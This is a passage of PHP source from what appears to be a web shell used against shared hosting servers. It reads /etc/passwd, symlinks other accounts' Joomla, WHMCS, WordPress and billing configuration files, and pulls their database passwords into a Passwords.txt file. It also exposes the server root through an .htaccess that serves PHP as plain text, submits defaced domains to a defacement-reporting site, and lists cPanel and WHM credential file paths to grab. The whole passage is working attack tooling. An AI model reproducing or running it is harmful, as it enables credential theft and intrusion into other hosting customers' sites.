@symlink('/home4/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');

}

//password grab

function entre2v2($text,$marqueurDebutLien,$marqueurFinLien)
{

$ar0=explode($marqueurDebutLien, $text);
$ar1=explode($marqueurFinLien, $ar0[1]);
$ar=trim($ar1[0]);
return $ar;
}

$ffile=fopen('Passwords.txt','a+');


$r= 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME'])."/config/";
$re=$r;
$confi=array("-Wordpress.txt","-Joomla.txt","-WHMCS.txt","-Vbulletin.txt","-Other.txt","-Zencart.txt","-Hostbills.txt","-SMF.txt","-Drupal.txt","-OsCommerce.txt","-MyBB.txt","-PHPBB.txt","-IPB.txt","-BoxBilling.txt");

$users=file("/etc/passwd");
foreach($users as $user)
{

$str=explode(":",$user);
$usersss=$str[0];
foreach($confi as $co)
{


$uurl=$re.$usersss.$co;
$uel=$uurl;

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $uel);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8');
$result['EXE'] = curl_exec($ch);
curl_close($ch);
$uxl=$result['EXE'];


if($uxl && preg_match('/table_prefix/i',$uxl))
{

//Wordpress

$dbp=entre2v2($uxl,"DB_PASSWORD', '","');");
if(!empty($dbp))
$pass=$dbp."\n";
fwrite($ffile,$pass);

}
elseif($uxl && preg_match('/cc_encryption_hash/i',$uxl))
{

//WHMCS

$dbp=entre2v2($uxl,"db_password = '","';");
if(!empty($dbp))
$pass=$dbp."\n";
fwrite($ffile,$pass);

}


elseif($uxl && preg_match('/dbprefix/i',$uxl))
{

//Joomla

$db=entre2v2($uxl,"password = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/admincpdir/i',$uxl))
{

//Vbulletin

$db=entre2v2($uxl,"password'] = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);

}
elseif($uxl && preg_match('/DB_DATABASE/i',$uxl))
{

//Other

$db=entre2v2($uxl,"DB_PASSWORD', '","');");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{

//Other

$db=entre2v2($uxl,"dbpass = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{

//Other

$db=entre2v2($uxl,"dbpass = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);

}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{

//Other

$db=entre2v2($uxl,"dbpass = \"","\";");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}


}
}
echo "<center>
<a href=\"config/root/\">Root Server</a>
<br><a href=\"config/Passwords.txt\">Passwords</a>
<br><a href=\"config/\">Configurations</a></center>";
}
else
{
echo "<center>
<form method=\"POST\">
<textarea name=\"passwd\" class='area' rows='15' cols='60'>";
$file = '/etc/passwd';
$read = @fopen($file, 'r');
if ($read){
$body = @fread($read, @filesize($file));
echo "".htmlentities($body)."";
}
elseif(!$read)
{
$read = @show_source($file) ;
}
elseif(!$read)
{
$read = @highlight_file($file);
}
elseif(!$read)
{
for($uid=0;$uid<1000;$uid++)
{
$ara = posix_getpwuid($uid);
if (!empty($ara))
{
while (list ($key, $val) = each($ara))
{
print "$val:";
}
print "\n";
}}}

flush();
 
echo "</textarea>
<p><input name=\"m\" size=\"80\" value=\"Start\" type=\"submit\"/></p>
</form></center>";
}
}
}
elseif($_GET['do'] == 'symlink') {
$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
$d0mains = @file("/etc/named.conf");
##httaces
if($d0mains){
@mkdir("scripts",0777);
@chdir("scripts");
@exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex tokeichun.html
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);@fclose($fp3);
echo "
<table align=center border=1 style='width:60%;border-color:#333333;'>
<tr>
<td align=center><font size=2>S. No.</font></td>
<td align=center><font size=2>Domains</font></td>
<td align=center><font size=2>Users</font></td>
<td align=center><font size=2>Symlink</font></td>
</tr>";
$dcount = 1;
foreach($d0mains as $d0main){
if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
<td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
<td>".$user['name']."</td>
<td><a href='$full/scripts/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>"; 
flush();
$dcount++;}}}
echo "</table>";
}else{
$TEST=@file('/etc/passwd');
if ($TEST){
@mkdir("scripts",0777);
@chdir("scripts");
exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex tokeichun.html
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);
 @fclose($fp3);
 echo "
 <table align=center border=1><tr>
 <td align=center><font size=3>S. No.</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $dcount = 1;
 $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
 while(!feof($file)){
 $s = fgets($file);
 $matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
 $matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/scripts/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("scripts",0777);@chdir("scripts");@exe("ln -s / root");$file3 = '
 Options Indexes FollowSymLinks
DirectoryIndex tokeichun.html
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any
';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);@fclose($fp3);
 echo "
 <div class='mybox'><h2 class='k2ll33d2'>server symlinker</h2>
 <table align=center border=1><tr>
 <td align=center><font size=3>ID</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $temp = "";$val1 = 0;$val2 = 1000;
 for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
 if ($uid)$temp .= join(':',$uid)."\n";}
 echo '<br/>';$temp = trim($temp);$file5 = 
 fopen("test.txt","w");
 fputs($file5,$temp);
 fclose($file5);$dcount = 1;$file = 
 fopen("test.txt", "r") or exit("Unable to open file!");
 while(!feof($file)){$s = fgets($file);$matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/scripts/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}
 fclose($file);
 echo "</table></div></center>";unlink("test.txt");
 } else 
 echo "<center><font size=3>Cannot create Symlink</font></center>";
 }
 }    
}
elseif($_GET['do'] == 'defacerid') {
echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='hekel' size='50' value='Mr.ToKeiChun69'><br>
		<u>Team</u>: <br>
		<input type='text' name='tim' size='50' value='Extreme Crew'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='sites'></textarea><br>
		<input type='submit' name='go' value='Submit' style='width: 450px;'>
		</form>";
$site = explode("\r\n", $_POST['sites']);
$go = $_POST['go'];
$hekel = $_POST['hekel'];
$tim = $_POST['tim'];
if($go) {
foreach($site as $sites) {
$zh = $sites;
$form_url = "https://www.defacer.id/notify";
$data_to_post = array();
$data_to_post['attacker'] = "$hekel";
$data_to_post['team'] = "$tim";
$data_to_post['poc'] = 'SQL Injection';
$data_to_post['url'] = "$zh";
$curl = curl_init();
curl_setopt($curl,CURLOPT_URL, $form_url);
curl_setopt($curl,CURLOPT_POST, sizeof($data_to_post));
curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"); //msnbot/1.0 (+http://search.msn.com/msnbot.htm)
curl_setopt($curl,CURLOPT_POSTFIELDS, $data_to_post);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_REFERER, 'https://defacer.id/notify.html');
$result = curl_exec($curl);
echo $result;
curl_close($curl);
echo "<br>";
}
}
}

elseif($_GET['do'] == 'config') {
	if($_POST){
		$passwd = $_POST['passwd'];
		mkdir("files_config", 0777);
		$isi_htc = "Options all\nRequire None\nSatisfy Any";
		$htc = fopen("files_config/.htaccess","w");
		fwrite($htc, $isi_htc);
		preg_match_all('/(.*?):x:/', $passwd, $user_config);
		foreach($user_config[1] as $user_tkc) {
			$user_config_dir = "/home/$user_tkc/public_html/";
			if(is_readable($user_config_dir)) {
				$grab_config = array(
										"/home/$user_tkc/.my.cnf" => "cpanel",
					"/home/$user_tkc/.accesshash" => "WHM-accesshash",
					"/home/$user_tkc/public_html/bw-configs/config.ini" => "BosWeb",
					"/home/$user_tkc/public_html/config/koneksi.php" => "Lokomedia",
					"/home/$user_tkc/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home/$user_tkc/public_html/clientarea/configuration.php" => "WHMCS",				
					"/home/$user_tkc/public_html/whmcs/configuration.php" => "WHMCS",
					"/home/$user_tkc/public_html/forum/config.php" => "phpBB",
					"/home/$user_tkc/public_html/sites/default/settings.php" => "Drupal",
					"/home/$user_tkc/public_html/config/settings.inc.php" => "PrestaShop",
					"/home/$user_tkc/public_html/app/etc/local.xml" => "Magento",
					"/home/$user_tkc/public_html/admin/config.php" => "OpenCart",
					"/home/$user_tkc/public_html/slconfig.php" => "Sitelok",
					"/home/$user_tkc/public_html/application/config/database.php" => "Ellislab",					
					"/home/$user_tkc/public_html/whm/configuration.php" => "WHMCS",
					"/home/$user_tkc/public_html/whmc/WHM/configuration.ph" => "WHMC",
					"/home/$user_tkc/public_html/central/configuration.php" => "WHM Central",
					"/home/$user_tkc/public_html/whm/WHMCS/configuration.php" => "WHMCS",
					"/home/$user_tkc/public_html/whm/whmcs/configuration.php" => "WHMCS",
					"/home/$user_tkc/public_html/submitticket.php" => "WHMCS",										
					"/home/$user_tkc/public_html/configuration.php" => "Joomla",					
					"/home/$user_tkc/public_html/Joomla/configuration.php" => "JoomlaJoomla",
					"/home/$user_tkc/public_html/joomla/configuration.php" => "JoomlaJoomla",
					"/home/$user_tkc/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",		
					"/home/$user_tkc/public_html/Home/configuration.php" => "JoomlaHome",
					"/home/$user_tkc/public_html/HOME/configuration.php" => "JoomlaHome",
					"/home/$user_tkc/public_html/home/configuration.php" => "JoomlaHome",
					"/home/$user_tkc/public_html/NEW/configuration.php" => "JoomlaNew",
					"/home/$user_tkc/public_html/New/configuration.php" => "JoomlaNew",
					"/home/$user_tkc/public_html/new/configuration.php" => "JoomlaNew",
					"/home/$user_tkc/public_html/News/configuration.php" => "JoomlaNews",
					"/home/$user_tkc/public_html/NEWS/configuration.php" => "JoomlaNews",
					"/home/$user_tkc/public_html/news/configuration.php" => "JoomlaNews",
					"/home/$user_tkc/public_html/Cms/configuration.php" => "JoomlaCms",
					"/home/$user_tkc/public_html/CMS/configuration.php" => "JoomlaCms",
					"/home/$user_tkc/public_html/cms/configuration.php" => "JoomlaCms",
					"/home/$user_tkc/public_html/Main/configuration.php" => "JoomlaMain",
					"/home/$user_tkc/public_html/MAIN/configuration.php" => "JoomlaMain",
					"/home/$user_tkc/public_html/main/configuration.php" => "JoomlaMain",
					"/home/$user_tkc/public_html/Blog/configuration.php" => "JoomlaBlog",
					"/home/$user_tkc/public_html/BLOG/configuration.php" => "JoomlaBlog",
					"/home/$user_tkc/public_html/blog/configuration.php" => "JoomlaBlog",
					"/home/$user_tkc/public_html/Blogs/configuration.php" => "JoomlaBlogs",
					"/home/$user_tkc/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
					"/home/$user_tkc/public_html/blogs/configuration.php" => "JoomlaBlogs",
					"/home/$user_tkc/public_html/beta/configuration.php" => "JoomlaBeta",
					"/home/$user_tkc/public_html/Beta/configuration.php" => "JoomlaBeta",
					"/home/$user_tkc/public_html/BETA/configuration.php" => "JoomlaBeta",
					"/home/$user_tkc/public_html/PRESS/configuration.php" => "JoomlaPress",
					"/home/$user_tkc/public_html/Press/configuration.php" => "JoomlaPress",
					"/home/$user_tkc/public_html/press/configuration.php" => "JoomlaPress",
					"/home/$user_tkc/public_html/Wp/configuration.php" => "JoomlaWp",
					"/home/$user_tkc/public_html/wp/configuration.php" => "JoomlaWp",
					"/home/$user_tkc/public_html/WP/configuration.php" => "JoomlaWP",
					"/home/$user_tkc/public_html/portal/configuration.php" => "JoomlaPortal",
					"/home/$user_tkc/public_html/PORTAL/configuration.php" => "JoomlaPortal",
					"/home/$user_tkc/public_html/Portal/configuration.php" => "JoomlaPortal",					
					"/home/$user_tkc/public_html/wp-config.php" => "WordPress",
					"/home/$user_tkc/public_html/wordpress/wp-config.php" => "WordPressWordpress",
					"/home/$user_tkc/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
					"/home/$user_tkc/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",		
					"/home/$user_tkc/public_html/Home/wp-config.php" => "WordPressHome",
					"/home/$user_tkc/public_html/HOME/wp-config.php" => "WordPressHome",
					"/home/$user_tkc/public_html/home/wp-config.php" => "WordPressHome",
					"/home/$user_tkc/public_html/NEW/wp-config.php" => "WordPressNew",
					"/home/$user_tkc/public_html/New/wp-config.php" => "WordPressNew",
					"/home/$user_tkc/public_html/new/wp-config.php" => "WordPressNew",
					"/home/$user_tkc/public_html/News/wp-config.php" => "WordPressNews",
					"/home/$user_tkc/public_html/NEWS/wp-config.php" => "WordPressNews",
					"/home/$user_tkc/public_html/news/wp-config.php" => "WordPressNews",
					"/home/$user_tkc/public_html/Cms/wp-config.php" => "WordPressCms",
					"/home/$user_tkc/public_html/CMS/wp-config.php" => "WordPressCms",
					"/home/$user_tkc/public_html/cms/wp-config.php" => "WordPressCms",
					"/home/$user_tkc/public_html/Main/wp-config.php" => "WordPressMain",
					"/home/$user_tkc/public_html/MAIN/wp-config.php" => "WordPressMain",
					"/home/$user_tkc/public_html/main/wp-config.php" => "WordPressMain",
					"/home/$user_tkc/public_html/Blog/wp-config.php" => "WordPressBlog",
					"/home/$user_tkc/public_html/BLOG/wp-config.php" => "WordPressBlog",
					"/home/$user_tkc/public_html/blog/wp-config.php" => "WordPressBlog",
					"/home/$user_tkc/public_html/Blogs/wp-config.php" => "WordPressBlogs",
					"/home/$user_tkc/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
					"/home/$user_tkc/public_html/blogs/wp-config.php" => "WordPressBlogs",
					"/home/$user_tkc/public_html/beta/wp-config.php" => "WordPressBeta",
					"/home/$user_tkc/public_html/Beta/wp-config.php" => "WordPressBeta",
					"/home/$user_tkc/public_html/BETA/wp-config.php" => "WordPressBeta",
					"/home/$user_tkc/public_html/PRESS/wp-config.php" => "WordPressPress",
					"/home/$user_tkc/public_html/Press/wp-config.php" => "WordPressPress",
					"/home/$user_tkc/public_html/press/wp-config.php" => "WordPressPress",
